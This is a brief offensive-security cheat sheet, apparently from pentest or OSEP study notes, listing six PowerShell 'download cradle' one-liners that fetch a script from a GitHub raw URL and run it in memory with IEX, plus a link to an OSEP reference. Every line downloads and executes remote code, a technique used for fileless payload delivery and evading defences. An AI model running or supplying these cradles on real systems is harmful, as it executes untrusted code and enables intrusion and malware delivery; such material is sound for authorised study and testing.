# Run Script cradles

iex (iwr "https://raw.githubusercontent.com/conma293/mvp/main/1.ps1")

IEX (Invoke-WebRequest -Uri "https://raw.githubusercontent.com/conma293/mvp/main/1.ps1").Content

iex ((Invoke-WebRequest -Uri "https://raw.githubusercontent.com/conma293/mvp/main/1.ps1").Content)

IEX((New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/conma293/mvp/main/1.ps1'))

iex ((New-Object System.Net.webclient).DownloadString('https://raw.githubusercontent.com/conma293/mvp/main/1.ps1')).content

IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/conma293/mvp/main/1.ps1')

#Download Cradle and general good refs
https://github.com/In3x0rabl3/OSEP/blob/main/osep_reference.md#download-cradle
